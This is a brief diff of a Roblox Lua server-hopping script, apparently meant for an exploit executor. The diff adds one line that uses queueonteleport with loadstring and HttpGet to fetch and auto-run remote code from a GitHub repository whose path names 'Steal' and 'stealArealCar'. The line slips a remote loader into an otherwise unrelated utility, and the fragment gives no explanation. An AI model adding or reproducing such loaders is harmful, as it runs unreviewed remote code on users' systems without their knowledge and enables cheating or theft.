@@ -7,7 +7,7 @@ local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
 
 local PLACE_ID = game.PlaceId
 local visitedServers = { [game.JobId] = true } -- Store the current server to avoid revisiting
-
+queueonteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaSecurity/Steal/refs/heads/main/stealArealCar"))()')
 -- Server hop function
 local function serverHop()
 	local servers = {}
